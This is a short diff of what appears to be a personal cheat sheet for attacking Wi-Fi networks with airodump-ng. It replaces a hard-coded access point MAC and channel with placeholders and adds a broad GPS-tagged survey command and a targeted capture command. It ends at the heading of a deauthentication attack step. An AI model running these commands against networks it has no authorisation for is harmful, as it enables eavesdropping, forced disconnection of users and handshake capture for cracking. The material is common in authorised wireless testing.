@@ -26,14 +26,19 @@ iwconfig
 ! Get the AP's MAC address and channel
 sudo airodump-ng wlan0mon
 
-! AP-MAC & channel - you need to select your own here:
-ESSID: 90:9A:4A:B8:F3:FB
-Channel used by AP for SSID: 2
+!broad survey
+sudo airodump-ng -w <filename> <wireless interface> --band abg --gpsd
+!! -w is to write a file, --band is for specifying 2.4 or 5/both (airsuite does 2.4 by default)
+--gpsd is for gps
+
+EXAMPLE: sudo airodump-ng -w BroadSurvey wlan1mon --band abg --gpsd
 
 !1st Window:
 !Make sure you replace the channel number and bssid with your own
 !Replace hack1 with your file name like capture1 or something 
-sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon
+sudo airodump-ng -w <filename> -c <channel> --bssid <mac of access point> <wireless interface>
+
+EXAMPLE sudo airodump-ng -w TargettedSurvey -c 6 --bssid 90:9A:4A:B8:F3:FB wlan1mon
 
 !2nd Window - deauth attack
 !Make sure you replace the bssid with your own
